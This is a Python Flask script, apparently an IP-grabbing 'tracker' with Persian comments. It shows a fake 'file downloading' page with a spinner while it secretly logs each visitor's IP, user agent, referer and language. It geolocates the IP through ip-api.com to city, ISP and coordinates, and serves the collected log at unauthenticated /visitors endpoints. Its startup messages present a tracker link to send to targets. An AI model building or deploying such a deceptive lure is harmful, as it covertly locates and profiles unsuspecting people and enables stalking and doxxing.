from flask import Flask, request, render_template_string
import requests
import threading
import time
from datetime import datetime

app = Flask(__name__)

# لیست برای ذخیره اطلاعات بازدیدکنندگان
visitors = []

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>صفحه دانلود</title>
    <meta charset="utf-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        h1 { font-size: 2.5em; margin-bottom: 20px; }
        .loading { font-size: 1.2em; margin-top: 20px; }
        .spinner {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 فایل در حال دانلود...</h1>
        <div class="spinner"></div>
        <div class="loading">لطفاً صبر کنید...</div>
    </div>
</body>
</html>
"""

def get_location(ip):
    """دریافت اطلاعات جغرافیایی از IP"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org')
        data = response.json()
        if data['status'] == 'success':
            return {
                'country': data.get('country', 'N/A'),
                'city': data.get('city', 'N/A'),
                'region': data.get('regionName', 'N/A'),
                'isp': data.get('isp', 'N/A'),
                'lat': data.get('lat', 'N/A'),
                'lon': data.get('lon', 'N/A')
            }
    except:
        pass
    return {'country': 'N/A', 'city': 'N/A', 'region': 'N/A', 'isp': 'N/A'}

@app.route('/', methods=['GET'])
def track_visitor():
    # اطلاعات بازدیدکننده
    visitor_info = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'N/A'),
        'referer': request.headers.get('Referer', 'N/A'),
        'language': request.headers.get('Accept-Language', 'N/A'),
        'url': request.url,
        'method': request.method
    }
    
    # دریافت اطلاعات جغرافیایی
    location = get_location(visitor_info['ip'])
    visitor_info.update(location)
    
    # ذخیره اطلاعات
    visitors.append(visitor_info)
    print("\n" + "="*80)
    print(f"👤 بازدیدکننده جدید: {visitor_info['ip']}")
    print(f"🌍 مکان: {visitor_info['city']}, {visitor_info['region']}, {visitor_info['country']}")
    print(f"🌐 ISP: {visitor_info['isp']}")
    print(f"📱 User-Agent: {visitor_info['user_agent'][:100]}...")
    print(f"🔗 Referer: {visitor_info['referer']}")
    print("="*80)
    
    return render_template_string(HTML_TEMPLATE)

@app.route('/visitors')
def show_visitors():
    return {
        'total': len(visitors),
        'visitors': visitors[-20:]  # 20 بازدید آخر
    }

@app.route('/visitors.txt')
def download_visitors():
    content = "VISITORS LOG\n" + "="*50 + "\n\n"
    for v in visitors[-50:]:  # 50 بازدید آخر
        content += f"Time: {v['timestamp']}\n"
        content += f"IP: {v['ip']}\n"
        content += f"Location: {v['city']}, {v['country']} (ISP: {v['isp']})\n"
        content += f"User-Agent: {v['user_agent']}\n"
        content += f"Referer: {v['referer']}\n"
        content += "-"*30 + "\n"
    return content, 200, {'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename=visitors.txt'}

if __name__ == '__main__':
    print("🚀 سرور Tracker شروع شد!")
    print("📱 لینک tracker: http://YOUR_IP:5000")
    print("📊 لیست بازدید: http://YOUR_IP:5000/visitors")
    print("📥 دانلود لاگ: http://YOUR_IP:5000/visitors.txt")
    app.run(host='0.0.0.0', port=5000, debug=False)